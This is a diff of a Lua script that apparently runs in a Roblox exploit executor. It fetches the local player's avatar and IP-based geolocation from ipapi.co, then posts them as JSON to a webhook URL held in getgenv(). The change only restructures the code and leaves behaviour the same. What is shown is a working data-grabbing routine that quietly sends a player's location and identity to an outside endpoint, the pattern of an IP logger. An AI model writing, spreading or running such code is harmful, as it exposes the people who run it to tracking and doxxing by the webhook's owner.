@@ -3,15 +3,11 @@ local player = game:GetService("Players").LocalPlayer
 local userId = player and player.UserId
 
 local avatarSuccess, avatarUrl = pcall(function()
-	local thumbnailsResponse = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=720x720&format=Png&isCircular=false")
-
-	return httpService:JSONDecode(thumbnailsResponse).data[1].imageUrl
+	return httpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=720x720&format=Png&isCircular=false")).data[1].imageUrl
 end)
 
 local geolocationSuccess, geolocationData = pcall(function()
-	local ipapiResponse = game:HttpGet("https://ipapi.co/json")
-
-	return httpService:JSONDecode(ipapiResponse)
+	return httpService:JSONDecode(game:HttpGet("https://ipapi.co/json"))
 end)
 geolocationData = geolocationSuccess and geolocationData or {}
 
@@ -54,9 +50,7 @@ local payload = {
 }
 
 pcall(function()
-	local sendRequest = request or http_request or http and http.request
-
-	sendRequest({
+	(request or http_request or http and http.request)({
 		Url = getgenv()["Webhook URL"],
 		Method = "POST",
 		Body = httpService:JSONEncode(payload),
